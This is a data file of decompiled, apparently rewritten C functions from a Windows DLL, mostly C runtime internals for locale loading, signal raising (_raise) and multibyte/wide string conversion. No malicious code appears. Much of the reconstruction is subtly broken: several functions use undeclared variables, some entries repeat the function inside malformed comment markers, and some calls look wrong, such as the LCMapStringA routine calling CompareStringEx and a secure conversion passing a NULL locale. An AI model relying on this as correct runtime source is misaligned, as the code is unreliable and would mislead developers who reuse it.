{"Function Name": "___acrt_eagerly_load_locale_apis", "Address": "1002d500", "Source Code": "void ___acrt_eagerly_load_locale_apis(void)\n{\n    \n    retrieve_AreFileApisANSI();\n    \n    \n    retrieve_CompareStringEx();\n    \n    \n    retrieve_EnumSystemLocalesEx();\n    \n    \n    retrieve_GetDateFormatEx();\n    \n    \n    retrieve_GetLocaleInfoEx();\n    \n    \n    retrieve_GetTimeFormatEx();\n    \n    \n    retrieve_GetUserDefaultLocaleName();\n    \n    \n    retrieve_IsValidLocaleName();\n    \n    \n    retrieve_LCMapStringEx();\n    \n    \n    retrieve_LCIDToLocaleName();\n    \n    \n    retrieve_LocaleNameToLCID();\n}"}
{"Function Name": "___acrt_uninitialize_winapi_thunks", "Address": "1002d55d", "Source Code": "undefined __cdecl ___acrt_uninitialize_winapi_thunks(char inputParam)\n{\n    \n    HMODULE *hModulePtr = (HMODULE *)&initialModuleAddress;\n    \n    if (inputParam == '\\0') {\n        \n        do {\n            \n            if (*hModulePtr && *hModulePtr != (HMODULE)0xffffffff) {\n                \n                FreeLibrary(*hModulePtr);\n                \n                *hModulePtr = (HMODULE)0x0;\n            }\n            \n            hModulePtr++;\n        \n        } while (hModulePtr != (HMODULE *)&finalModuleAddress);\n    }\n    \n    return 1;\n}"}
{"Function Name": "___acrt_execute_initializers", "Address": "1002d5ae", "Source Code": "void __cdecl ___acrt_execute_initializers(undefined **start_ptr, undefined **end_ptr)\n{\n    \n    code **func_ptr_array = (code **)start_ptr;\n    code *func_ptr; \n    char return_value; \n    uint security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    \n    if (start_ptr != end_ptr) {\n        do {\n            func_ptr = *func_ptr_array; \n            \n            if (func_ptr != (code *)0x0) {\n                \n                (*(code *)PTR__guard_check_icall_1003a2f8)();\n                return_value = (*func_ptr)(); \n                \n                if (return_value == '\\0') break;\n            }\n            func_ptr_array += 2; \n        } while (func_ptr_array != (code **)end_ptr); \n        \n        if (func_ptr_array != (code **)end_ptr && func_ptr_array != (code **)start_ptr) {\n            func_ptr_array--; \n            do {\n                \n                if ((func_ptr_array[-1] != (code *)0x0) && (func_ptr = *func_ptr_array, func_ptr != (code *)0x0)) {\n                    \n                    (*(code *)PTR__guard_check_icall_1003a2f8)(0);\n                    (*func_ptr)(); \n                }\n                func_ptr_array -= 2; \n            } while (func_ptr_array != (code **)start_ptr); \n        }\n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "___acrt_execute_uninitializers", "Address": "1002d631", "Source Code": "void __cdecl ___acrt_execute_uninitializers(undefined **start_uninitializer, undefined **end_uninitializer)\n{\n    code **current_uninitializer; \n    if (start_uninitializer != end_uninitializer) { \n        current_uninitializer = (code **)(end_uninitializer - 1); \n        do {\n            code *uninitializer_function = *current_uninitializer; \n            if (uninitializer_function != (code *)0x0) { \n                (*(code *)PTR__guard_check_icall_1003a2f8)(0); \n                (*uninitializer_function)(); \n            }\n            current_uninitializer -= 2; \n        } while (current_uninitializer != start_uninitializer); \n    }\n    ___security_check_cookie_4(DAT_1004e008 ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "operator()<>", "Address": "1002d67e", "Source Code": "uint operator()<>(int *input_pointer) \n{\n    byte byte_mask; \n    uint unsigned_value; \n    ___acrt_lock(*input_pointer); \n    byte_mask = (byte)data_value_1 & 0x1f; \n    unsigned_value = data_value_1 ^ data_value_2; \n    external_function(); \n    return unsigned_value >> byte_mask | unsigned_value << (0x20 - byte_mask); \n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_ec61778202f4f5fc7e7711acc23c3bca>_>", "Address": "1002d6d8", "Source Code": "\\*\n_func_void_int * __cdecl\n__acrt_lock_and_call<class_<lambda_ec61778202f4f5fc7e7711acc23c3bca>_>\n(__acrt_lock_id param_1,<lambda_ec61778202f4f5fc7e7711acc23c3bca> *param_2)\n{\n    \n    return (_func_void_int *)operator()<>((int *)&param_1);\n}\n*\\ \n \n_func_void_int * __cdecl\n__acrt_lock_and_call<class_<lambda_ec61778202f4f5fc7e7711acc23c3bca>_>\n(__acrt_lock_id param_1,<lambda_ec61778202f4f5fc7e7711acc23c3bca> *param_2)\n{\n    return (_func_void_int *)operator()<>((int *)&param_1);\n}"}
{"Function Name": "get_global_action_nolock", "Address": "1002d700", "Source Code": "\\*\n_func_void_int ** __cdecl get_global_action_nolock(int action_id)\n{\n    \n    if (action_id == 2) {\n        \n        return (_func_void_int **)&global_action_2;\n    }\n    \n    if (action_id == 0xf) {\n        \n        return (_func_void_int **)&global_action_15;\n    }\n    \n    if (action_id == 0x15) {\n        \n        return (_func_void_int **)&global_action_21;\n    }\n    \n    if (action_id == 0x16) {\n        \n        return (_func_void_int **)&global_action_22;\n    }\n    \n    return (_func_void_int **)0x0;\n}\n*\\ \n \n_func_void_int ** __cdecl get_global_action_nolock(int action_id)\n{\n    if (action_id == 2) {\n        return (_func_void_int **)&global_action_2;\n    }\n    if (action_id == 0xf) {\n        return (_func_void_int **)&global_action_15;\n    }\n    if (action_id == 0x15) {\n        return (_func_void_int **)&global_action_21;\n    }\n    if (action_id == 0x16) {\n        return (_func_void_int **)&global_action_22;\n    }\n    return (_func_void_int **)0x0;\n}"}
{"Function Name": "___acrt_initialize_signal_handlers", "Address": "1002d781", "Source Code": "void __cdecl ___acrt_initialize_signal_handlers(char **signal_handlers)\n{\n    \n    for (int index = 0; index < 4; index++) {\n        \n        __crt_state_management::dual_state_global<char**>::initialize(\n            (dual_state_global<char**> *)&global_handler + index, signal_handlers);\n    }\n}"}
{"Function Name": "_raise", "Address": "1002d7c5", "Source Code": "int __cdecl _raise(int signal_number) \n{\n    __crt_signal_action_t **signal_action_pointer = (__crt_signal_action_t **)0x0; \n    undefined4 *data_pointer; \n    __crt_signal_action_t *signal_action; \n    _func_void_int **function_pointer_pointer; \n    _func_void_int *signal_handler; \n    int integer_value; \n    undefined4 local_data = 0; \n    char state_tracking = '\\x01'; \n    \n    if (8 < signal_number) {\n        \n        if (signal_number == 0xb) goto LAB_1002d81f; \n        if ((signal_number == 0xf) || ((0x14 < signal_number && (signal_number < 0x17)))) goto LAB_1002d814; \n        goto LAB_1002d84a; \n    }\n    \n    \n    if (signal_number == 8) {\nLAB_1002d81f:\n        signal_action_pointer = (__crt_signal_action_t **)FUN_10029372(); \n        if (signal_action_pointer == (__crt_signal_action_t **)0x0) goto LAB_1002d9c7; \n        signal_action = siglookup(signal_number, *signal_action_pointer); \n        if (signal_action == (__crt_signal_action_t *)0x0) goto LAB_1002d84a; \n        function_pointer_pointer = (_func_void_int **)(signal_action + 8); \n        state_tracking = '\\0'; \n    } else {\n        \n        if (signal_number != 2) {\n            if (signal_number == 4) goto LAB_1002d81f; \n            if (signal_number != 6) goto LAB_1002d84a; \n        }\n        function_pointer_pointer = get_global_action_nolock(signal_number); \n    }\n    \n    if (state_tracking != '\\0') {\n        ___acrt_lock(3); \n    }\n    \n    signal_handler = *function_pointer_pointer; \n    if (state_tracking != '\\0') {\n        ___acrt_unlock(3); \n    }\n    \n    if (signal_handler != (_func_void_int *)0x1) {\n        if (signal_handler == (_func_void_int *)0x0) {\n            __exit(3); \n        }\n        \n        if (((signal_number == 8) || (signal_number == 0xb)) || (signal_number == 4)) {\n            if (signal_number == 8) {\n                data_pointer = (undefined4 *)FUN_1002d7bc(); \n                local_data = *data_pointer; \n                data_pointer = (undefined4 *)FUN_1002d7bc(); \n                *data_pointer = 0x8c; \n            }\n            signal_action_pointer[1] = (__crt_signal_action_t *)0x0; \n        } else {\n            \n            if (signal_number == 8) {\n                signal_action = *signal_action_pointer + DAT_1003ee74 * 0xc; \n                for (__crt_signal_action_t *signal_action_end = signal_action + DAT_1003ee78 * 0xc; signal_action != signal_action_end; signal_action = signal_action + 0xc) {\n                    *(undefined4 *)(signal_action + 8) = 0; \n                }\n            }\n        }\n        *function_pointer_pointer = (_func_void_int *)((0U >> (0x20 - ((byte)DAT_1004e008 & 0x1f)) & 0x1f) ^ DAT_1004e008); \n    }\n    FUN_1002d985(); \n    \n    if (signal_handler != (_func_void_int *)0x1) {\n        if (signal_number == 8) {\n            __acrt_ptd *thread_data = FUN_10029224(); \n            integer_value = 0x1002d970; \n            (*(code *)PTR__guard_check_icall_1003a2f8)(8, *(undefined4 *)(thread_data + 8)); \n            (*signal_handler)(integer_value); \n        } else {\n            integer_value = 0x1002d99e; \n            (*(code *)PTR__guard_check_icall_1003a2f8)(signal_number); \n            (*signal_handler)(integer_value); \n            if ((signal_number != 0xb) && (signal_number != 4)) goto LAB_1002d9c7; \n        }\n        signal_action_pointer[1] = (__crt_signal_action_t *)0x0; \n        if (signal_number == 8) {\n            __acrt_ptd *thread_data = FUN_10029224(); \n            *(undefined4 *)(thread_data + 8) = local_data; \n        }\n    }\nLAB_1002d9c7:\n    return FUN_100373d9(); \n}"}
{"Function Name": "FUN_1002d9e6", "Address": "1002d9e6", "Source Code": "void __cdecl FUN_1002d9e6(char **inputPointer)\n{\n    \n    __crt_state_management::dual_state_global<char**>::initialize((dual_state_global<char**> *)&globalState, inputPointer);\n}"}
{"Function Name": "___acrt_invoke_user_matherr", "Address": "1002d9fa", "Source Code": "void __cdecl ___acrt_invoke_user_matherr(undefined4 user_param)\n{\n    \n    uint unique_value = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    byte lower_bits = (byte)DAT_1004e008 & 0x1f;\n    \n    code *function_pointer = (code *)((DAT_1004e008 ^ _DAT_100503a8) >> lower_bits |\n                            (DAT_1004e008 ^ _DAT_100503a8) << (0x20 - lower_bits));\n    \n    if (function_pointer != (code *)0x0) {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(user_param);\n        \n        \n        (*function_pointer)();\n    }\n    \n    ___security_check_cookie_4(unique_value);\n}"}
{"Function Name": "_mbstowcs_l_helper", "Address": "1002da43", "Source Code": "uint __cdecl\n_mbstowcs_l_helper(wchar_t *param_1, char *param_2, uint param_3, __crt_locale_pointers *param_4)\n{\n    uint uVar7 = 0; \n    if (param_1 != (wchar_t *)0x0) { \n        if (param_3 == 0) { \n            return 0; \n        }\n        *param_1 = L'\\0'; \n    }\n    if (param_2 == (char *)0x0) { \n        undefined4 *puVar3 = (undefined4 *)FUN_100253b8(); \n        *puVar3 = 0x16; \n        FUN_1001de96(); \n        return 0xffffffff; \n    }\n    int local_1c; \n    FUN_1001bfff(&local_1c, (__acrt_ptd **)param_4); \n    if (param_1 == (wchar_t *)0x0) { \n        if ((local_18.locinfo)->locale_name[2] == (wchar_t *)0x0) { \n            char *pcVar1 = param_2 + 1; \n            do {\n                if (*param_2 == '\\0') break; \n                param_2++; \n            } while (1);\n            uVar7 = (int)param_2 - (int)pcVar1; \n            goto LAB_1002dba3; \n        }\n        uVar7 = 0xffffffff; \n        int iVar4 = MultiByteToWideChar((local_18.locinfo)->lc_collate_cp, 9, param_2, -1, (LPWSTR)0x0, 0); \n        if (iVar4 == 0) { \n            undefined4 *puVar3 = (undefined4 *)FUN_100253b8(); \n            *puVar3 = 0x2a; \n            goto LAB_1002dba3; \n        }\n    } else {\n        if ((local_18.locinfo)->locale_name[2] == (wchar_t *)0x0) { \n            if (param_3 != 0) { \n                do {\n                    *param_1 = (ushort)(byte)param_2[uVar7]; \n                    if (param_2[uVar7] == '\\0') break; \n                    uVar7++; \n                    param_1++; \n                } while (uVar7 < param_3); \n            }\n            goto LAB_1002dba3; \n        }\n        int iVar4 = MultiByteToWideChar((local_18.locinfo)->lc_collate_cp, 9, param_2, -1, param_1, param_3); \n        if (iVar4 == 0) { \n            DWORD DVar5 = GetLastError(); \n            if (DVar5 == 0x7a) { \n                byte *local_8 = (byte *)param_2; \n                uint uVar7_temp = param_3; \n                if (param_3 != 0) { \n                    do {\n                        if (*local_8 == 0) break; \n                        if (__isleadbyte_l((uint)*local_8, &local_18) && *(local_8 + 1) == 0) goto LAB_1002db4c; \n                        local_8 += 2; \n                        uVar7_temp--; \n                    } while (uVar7_temp != 0); \n                }\n                uVar7 = MultiByteToWideChar((local_18.locinfo)->lc_collate_cp, 1, param_2, (int)local_8 - (int)param_2, param_1, param_3); \n                if (uVar7 != 0) goto LAB_1002dba3; \n            }\n        }\n    }\nLAB_1002db4c:\n    undefined4 *puVar3 = (undefined4 *)FUN_100253b8(); \n    *puVar3 = 0x2a; \n    *param_1 = L'\\0'; \n    uVar7 = 0xffffffff; \nLAB_1002dba3:\n    if (local_10 != '\\0') { \n        *(uint *)(local_1c + 0x350) &= 0xfffffffd; \n    }\n    return uVar7; \n}"}
{"Function Name": "__mbstowcs_s_l", "Address": "1002dbbc", "Source Code": "errno_t __cdecl\n__mbstowcs_s_l(size_t *_PtNumOfCharConverted, wchar_t *_DstBuf, size_t _SizeInWords, char *_SrcBuf,\nsize_t _MaxCount, _locale_t _Locale)\n{\n    size_t sVar2; \n    errno_t eVar5; \n    eVar5 = 0; \n    \n    \n    if (_DstBuf == (wchar_t *)0x0) {\n        \n        if (_SizeInWords != 0) {\n            eVar5 = 0x16; \n            FUN_1001de96(); \n            return eVar5; \n        }\n    } else {\n        \n        if (_SizeInWords == 0) {\n            eVar5 = 0x16; \n            FUN_1001de96(); \n            return eVar5; \n        }\n        *_DstBuf = L'\\0'; \n    }\n    \n    if (_PtNumOfCharConverted != (size_t *)0x0) {\n        *_PtNumOfCharConverted = 0; \n    }\n    \n    FUN_1001bfff(NULL, (__acrt_ptd **)_Locale);\n    \n    \n    sVar2 = (_MaxCount <= _SizeInWords) ? _MaxCount : _SizeInWords;\n    \n    if (sVar2 < 0x80000000) {\n        uint uVar4 = _mbstowcs_l_helper(_DstBuf, _SrcBuf, sVar2, NULL); \n        \n        \n        if (uVar4 == 0xffffffff) {\n            if (_DstBuf != (wchar_t *)0x0) {\n                *_DstBuf = L'\\0'; \n            }\n            eVar5 = *(errno_t *)FUN_100253b8(); \n            goto LAB_1002dc86; \n        }\n        \n        uVar4++; \n        \n        \n        if (_DstBuf != (wchar_t *)0x0) {\n            if (_SizeInWords < uVar4) {\n                \n                if (_MaxCount != 0xffffffff) {\n                    *_DstBuf = L'\\0'; \n                    eVar5 = 0x22; \n                    goto LAB_1002dc67; \n                }\n                eVar5 = 0x50; \n                uVar4 = _SizeInWords; \n            }\n            _DstBuf[uVar4 - 1] = L'\\0'; \n        }\n        \n        \n        if (_PtNumOfCharConverted != (size_t *)0x0) {\n            *_PtNumOfCharConverted = uVar4; \n        }\n    } else {\n        eVar5 = 0x16; \n    }\nLAB_1002dc67:\n    *(errno_t *)FUN_100253b8() = eVar5; \n    FUN_1001de96(); \nLAB_1002dc86:\n    return eVar5; \n}"}
{"Function Name": "_mbstowcs_s", "Address": "1002dc9f", "Source Code": "errno_t __cdecl\n_mbstowcs_s(size_t *_PtNumOfCharConverted, wchar_t *_DstBuf, size_t _SizeInWords, char *_SrcBuf, size_t _MaxCount)\n{\n    \n    \n    return __mbstowcs_s_l(_PtNumOfCharConverted, _DstBuf, _SizeInWords, _SrcBuf, _MaxCount, (_locale_t)0x0);\n}"}
{"Function Name": "_wcstombs_l_helper", "Address": "1002dcbf", "Source Code": "uint __cdecl\n_wcstombs_l_helper(char *param_1, wchar_t *param_2, uint param_3, __crt_locale_pointers *param_4)\n{\n    char cVar1; \n    wchar_t wVar2; \n    undefined4 *puVar3; \n    int iVar5; \n    DWORD DVar6; \n    uint uVar7; \n    uint uVar8; \n    int local_30; \n    int local_2c; \n    int local_14; \n    CHAR local_10[8]; \n    uint local_8; \n    \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    uVar8 = 0; \n    \n    if ((param_1 != (char *)0x0) && (param_3 == 0)) goto LAB_1002df2f;\n    \n    if (param_2 == (wchar_t *)0x0) {\n        puVar3 = (undefined4 *)FUN_100253b8(); \n        *puVar3 = 0x16; \n        FUN_1001de96(); \n        goto LAB_1002df2f; \n    }\n    \n    FUN_1001bfff(&local_30, (__acrt_ptd **)param_4);\n    \n    if (param_1 == (LPSTR)0x0) {\n        \n        if (*(int *)(local_2c + 0xa8) == 0) {\n            wVar2 = *param_2; \n            \n            while (wVar2 != L'\\0') {\n                if (0xff < (ushort)wVar2) goto LAB_1002df0f; \n                param_2 = param_2 + 1; \n                wVar2 = *param_2; \n            }\n        } else {\n            \n            iVar5 = WideCharToMultiByte(*(UINT *)(local_2c + 8), 0, param_2, -1, (LPSTR)0x0, 0, (LPCSTR)0x0, &local_14);\n            \n            if ((iVar5 == 0) || (local_14 != 0)) {\n                LAB_1002df0f:\n                puVar3 = (undefined4 *)FUN_100253b8(); \n                *puVar3 = 0x2a; \n            }\n        }\n    } else if (*(int *)(local_2c + 0xa8) == 0) {\n        \n        if (param_3 != 0) {\n            do {\n                if (0xff < (ushort)*param_2) goto LAB_1002deb0; \n                param_1[uVar8] = *(CHAR *)param_2; \n                wVar2 = *param_2; \n                param_2 = param_2 + 1; \n            } while ((wVar2 != L'\\0') && (uVar8 = uVar8 + 1, uVar8 < param_3)); \n        }\n    } else if (*(int *)(local_2c + 4) == 1) {\n        \n        if (param_3 != 0) {\n            wchar_t *pwVar4 = param_2; \n            do {\n                if (*pwVar4 == L'\\0') break; \n                pwVar4 = pwVar4 + 1; \n                param_3--; \n            } while (param_3 != 0); \n            \n            if ((param_3 != 0) && (*pwVar4 == L'\\0')) {\n                param_3 = ((int)pwVar4 - (int)param_2 >> 1) + 1; \n            }\n        }\n        \n        iVar5 = WideCharToMultiByte(*(UINT *)(local_2c + 8), 0, param_2, param_3, param_1, param_3, (LPCSTR)0x0, &local_14);\n        \n        if (iVar5 != 0) {\n            if (local_14 == 0) goto LAB_1002df1d; \n        }\n        LAB_1002deb0:\n        puVar3 = (undefined4 *)FUN_100253b8(); \n        *puVar3 = 0x2a; \n    } else {\n        \n        iVar5 = WideCharToMultiByte(*(UINT *)(local_2c + 8), 0, param_2, -1, param_1, param_3, (LPCSTR)0x0, &local_14);\n        \n        if (iVar5 != 0) goto LAB_1002df1d; \n        \n        if ((local_14 != 0) || (DVar6 = GetLastError(), DVar6 != 0x7a)) goto LAB_1002deb0; \n        if (param_3 != 0) {\n            uVar8 = 0; \n            do {\n                iVar5 = *(int *)(local_2c + 4); \n                if (5 < iVar5) {\n                    iVar5 = 5; \n                }\n                \n                uVar7 = WideCharToMultiByte(*(UINT *)(local_2c + 8), 0, param_2, 1, local_10, iVar5, (LPCSTR)0x0, &local_14);\n                \n                if ((((uVar7 == 0) || (local_14 != 0)) || ((int)uVar7 < 0)) || (5 < uVar7)) goto LAB_1002df0f;\n                if (param_3 < uVar7 + uVar8) break; \n                int local_20 = 0; \n                if (0 < (int)uVar7) {\n                    do {\n                        cVar1 = local_10[local_20]; \n                        param_1[uVar8] = cVar1; \n                        if (cVar1 == '\\0') goto LAB_1002df1d; \n                        local_20 = local_20 + 1; \n                        uVar8 = uVar8 + 1; \n                    } while (local_20 < (int)uVar7); \n                }\n                param_2 = param_2 + 1; \n            } while (uVar8 < param_3); \n        }\n    }\n    LAB_1002df1d:\n    \n    if (local_24 != '\\0') {\n        *(uint *)(local_30 + 0x350) = *(uint *)(local_30 + 0x350) & 0xfffffffd; \n    }\n    LAB_1002df2f:\n    \n    uVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n    return uVar8; \n}"}
{"Function Name": "__wcstombs_s_l", "Address": "1002df40", "Source Code": "errno_t __cdecl\n__wcstombs_s_l(size_t *_PtNumOfCharConverted, char *_Dst, size_t _DstSizeInBytes, wchar_t *_Src,\nsize_t _MaxCountInBytes, _locale_t _Locale)\n{\n    uint uVar3; \n    size_t sVar4; \n    errno_t eVar5; \n    \n    if (_Dst == (char *)0x0) {\n        \n        if (_DstSizeInBytes != 0) {\n            errno_t *peVar1 = (errno_t *)FUN_100253b8(); \n            *peVar1 = 0x16; \n            FUN_1001de96(); \n            return 0x16; \n        }\n    } else if (_DstSizeInBytes == 0) {\n        \n        errno_t *peVar1 = (errno_t *)FUN_100253b8(); \n        *peVar1 = 0x16; \n        FUN_1001de96(); \n        return 0x16; \n    }\n    \n    if (_Dst != (char *)0x0) {\n        *_Dst = '\\0'; \n    }\n    \n    if (_PtNumOfCharConverted != (size_t *)0x0) {\n        *_PtNumOfCharConverted = 0; \n    }\n    \n    sVar4 = (_MaxCountInBytes <= _DstSizeInBytes) ? _MaxCountInBytes : _DstSizeInBytes;\n    \n    if (sVar4 < 0x80000000) {\n        \n        uVar3 = _wcstombs_l_helper(_Dst, _Src, sVar4, (__crt_locale_pointers *)_Locale);\n        \n        if (uVar3 == 0xffffffff) {\n            \n            if (_Dst != (char *)0x0) {\n                *_Dst = '\\0'; \n            }\n            errno_t *peVar1 = (errno_t *)FUN_100253b8(); \n            return *peVar1; \n        }\n        sVar4 = uVar3 + 1; \n        \n        if (_Dst == (char *)0x0) {\n            eVar5 = 0; \n        } else {\n            \n            if (_DstSizeInBytes < sVar4) {\n                \n                if ((_MaxCountInBytes != 0xffffffff) && (*_Dst = '\\0', _DstSizeInBytes <= sVar4)) {\n                    errno_t *peVar1 = (errno_t *)FUN_100253b8(); \n                    eVar5 = 0x22; \n                    goto LAB_1002dfde; \n                }\n                eVar5 = 0x50; \n                sVar4 = _DstSizeInBytes; \n            } else {\n                eVar5 = 0; \n            }\n            _Dst[sVar4 - 1] = '\\0'; \n        }\n        \n        if (_PtNumOfCharConverted != (size_t *)0x0) {\n            *_PtNumOfCharConverted = sVar4; \n        }\n    } else {\n        errno_t *peVar1 = (errno_t *)FUN_100253b8(); \n        eVar5 = 0x16; \nLAB_1002dfde:\n        *peVar1 = eVar5; \n        FUN_1001de96(); \n    }\n    return eVar5; \n}"}
{"Function Name": "InternalGetLocaleInfoA", "Address": "1002e00d", "Source Code": "int __cdecl\nInternalGetLocaleInfoA\n(__crt_locale_pointers *param_1,wchar_t *param_2,ulong param_3,char *param_4,int param_5)\n{\n    uint uVar1; \n    int iVar2; \n    undefined4 *lpWideCharStr; \n    UINT local_c; \n    uint local_8; \n    \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    FUN_1001bfff(&local_c,(__acrt_ptd **)param_1);\n    \n    iVar2 = FUN_1002d288(param_2,param_3,(wchar_t *)0x0,0);\n    if (iVar2 == 0) goto LAB_1002e0e2; \n    uVar1 = iVar2 * 2; \n    \n    if ((uVar1 + 8 & -(uint)(uVar1 < uVar1 + 8)) == 0) {\n        lpWideCharStr = (undefined4 *)0x0; \n    } else if ((-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8) < 0x401) {\n        lpWideCharStr = (undefined4 *)&stack0xffffffd8; \n    } else {\n        \n        lpWideCharStr = (undefined4 *)__malloc_base(-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8);\n        if (lpWideCharStr == (undefined4 *)0x0) {\n            goto LAB_1002e0e2; \n        }\n        *lpWideCharStr = 0xdddd; \n    }\n    \n    if (lpWideCharStr != (undefined4 *)0x0) {\n        \n        iVar2 = FUN_1002d288(param_2,param_3,(wchar_t *)lpWideCharStr,iVar2);\n        if (iVar2 != 0) {\n            \n            WideCharToMultiByte(local_c,0,(LPCWSTR)lpWideCharStr,-1,\n                                (LPSTR)(-(uint)(param_5 != 0) & (uint)param_4),param_5,(LPCSTR)0x0,\n                                (LPBOOL)0x0);\n        }\n    }\n    \n    __freea_crt((int)lpWideCharStr);\nLAB_1002e0e2:\n    \n    if (local_10 != '\\0') {\n        *(uint *)(local_c + 0x350) = *(uint *)(local_c + 0x350) & 0xfffffffd;\n    }\n    \n    return ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "___acrt_GetStringTypeA", "Address": "1002e2ba", "Source Code": "void __cdecl\n___acrt_GetStringTypeA\n(__acrt_ptd **param_1,DWORD param_2,LPCSTR param_3,int param_4,LPWORD param_5,UINT param_6\n,int param_7)\n{\n    uint _Size; \n    undefined4 *lpWideCharStr; \n    int cchSrc; \n    undefined4 *puVar1; \n    int local_1c; \n    uint local_8; \n    \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    FUN_1001bfff(&local_1c,param_1);\n    \n    \n    if (param_6 == 0) {\n        param_6 = *(UINT *)(local_1c + 8);\n    }\n    \n    \n    local_c = MultiByteToWideChar(param_6,(uint)(param_7 != 0) * 8 + 1,param_3,param_4,(LPWSTR)0x0,0);\n    \n    \n    if (local_c == 0) goto LAB_1002e3b1;\n    \n    \n    _Size = local_c * 2;\n    \n    \n    if ((_Size + 8 & -(uint)(_Size < _Size + 8)) == 0) {\n        lpWideCharStr = (undefined4 *)0x0; \n        LAB_1002e372:\n        \n        \n        if (lpWideCharStr != (undefined4 *)0x0) {\n            \n            _memset(lpWideCharStr,0,_Size);\n            \n            \n            cchSrc = MultiByteToWideChar(param_6,1,param_3,param_4,(LPWSTR)lpWideCharStr,local_c);\n            \n            \n            if (cchSrc != 0) {\n                GetStringTypeW(param_2,(LPCWSTR)lpWideCharStr,cchSrc,param_5);\n            }\n        }\n    }\n    \n    else if ((-(uint)(_Size < _Size + 8) & _Size + 8) < 0x401) {\n        puVar1 = (undefined4 *)&stack0xffffffd8; \n        lpWideCharStr = (undefined4 *)&stack0xffffffd8; \n        \n        \n        if (&stack0x00000000 != (undefined *)0x28) {\n            LAB_1002e36b:\n            lpWideCharStr = puVar1 + 2; \n            goto LAB_1002e372; \n        }\n    }\n    \n    else {\n        lpWideCharStr = (undefined4 *)__malloc_base(-(uint)(_Size < _Size + 8) & _Size + 8);\n        \n        \n        if (lpWideCharStr != (undefined4 *)0x0) {\n            *lpWideCharStr = 0xdddd; \n            puVar1 = lpWideCharStr; \n            goto LAB_1002e36b; \n        }\n    }\n    \n    \n    __freea_crt((int)lpWideCharStr);\n    \n    LAB_1002e3b1:\n    \n    if (*(char *)&local_1c != '\\0') {\n        *(uint *)(local_1c + 0x350) = *(uint *)(local_1c + 0x350) & 0xfffffffd;\n    }\n    \n    \n    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n    \n    return; \n}"}
{"Function Name": "__acrt_LCMapStringA_stat", "Address": "1002e3d7", "Source Code": "int __cdecl\n__acrt_LCMapStringA_stat\n(__crt_locale_pointers *param_1, wchar_t *param_2, ulong param_3, char *param_4, int param_5,\nchar *param_6, int param_7, int param_8, int param_9)\n{\n    uint uVar1; \n    uint uVar2; \n    int iVar3;  \n    int iVar4;  \n    undefined4 *lpWideCharStr; \n    undefined4 *puVar5; \n    uVar2 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    iVar4 = param_5; \n    if (0 < param_5) { \n        iVar3 = ___strncnt(param_4, param_5); \n        iVar4 = (param_5 <= iVar3) ? iVar3 : iVar3 + 1; \n    }\n    if (param_8 == 0) { \n        param_8 = *(int *)(*(int *)param_1 + 8); \n    }\n    iVar3 = MultiByteToWideChar(param_8, (uint)(param_9 != 0) * 8 + 1, param_4, iVar4, (LPWSTR)0x0, 0); \n    if (iVar3 == 0) goto LAB_1002e5cf; \n    uVar1 = iVar3 * 2; \n    if ((uVar1 + 8 & -(uint)(uVar1 < uVar1 + 8)) == 0) { \n        lpWideCharStr = (undefined4 *)0x0; \n    } else if ((-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8) < 0x401) { \n        lpWideCharStr = (undefined4 *)&stack0xffffffe8; \n    } else {\n        lpWideCharStr = (undefined4 *)__malloc_base(-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8); \n        if (lpWideCharStr != (undefined4 *)0x0) {\n            *lpWideCharStr = 0xdddd; \n        }\n    }\n    \n    if (lpWideCharStr != (undefined4 *)0x0 && \n        (iVar4 = MultiByteToWideChar(param_8, 1, param_4, iVar4, (LPWSTR)lpWideCharStr, iVar3), iVar4 != 0) && \n        (iVar4 = ___acrt_CompareStringEx_36(param_2, param_3, (wchar_t *)lpWideCharStr, iVar3, (wchar_t *)0x0, 0, \n        (_nlsversioninfo *)0x0, (void *)0x0, 0), iVar4 != 0)) { \n        \n        if ((param_3 & 0x400) == 0) { \n            uVar1 = iVar4 * 2; \n            if ((uVar1 + 8 & -(uint)(uVar1 < uVar1 + 8)) == 0) { \n                puVar5 = (undefined4 *)0x0; \n            } else if ((-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8) < 0x401) { \n                puVar5 = (undefined4 *)&stack0xffffffe8; \n            } else {\n                puVar5 = (undefined4 *)__malloc_base(-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8); \n                if (puVar5 != (undefined4 *)0x0) {\n                    *puVar5 = 0xdddd; \n                }\n            }\n            \n            if (puVar5 != (undefined4 *)0x0 && \n                (iVar3 = ___acrt_CompareStringEx_36(param_2, param_3, (wchar_t *)lpWideCharStr, iVar3, (wchar_t *)puVar5, \n                iVar4, (_nlsversioninfo *)0x0, (void *)0x0, 0), iVar3 != 0)) { \n                \n                if (param_7 == 0) { \n                    param_6 = (LPSTR)0x0; \n                }\n                iVar4 = WideCharToMultiByte(param_8, 0, (LPCWSTR)puVar5, iVar4, param_6, param_7, (LPCSTR)0x0, \n                (LPBOOL)0x0);\n                if (iVar4 != 0) { \n                    __freea_crt((int)puVar5); \n                    goto LAB_1002e5c6; \n                }\n            }\n        } else if ((param_7 != 0) && (iVar4 <= param_7)) { \n            ___acrt_CompareStringEx_36(param_2, param_3, (wchar_t *)lpWideCharStr, iVar3, (wchar_t *)param_6, param_7, \n            (_nlsversioninfo *)0x0, (void *)0x0, 0);\n        }\n    }\n    \nLAB_1002e5c6:\n    __freea_crt((int)lpWideCharStr); \nLAB_1002e5cf:\n    iVar4 = ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc); \n    return iVar4; \n}"}
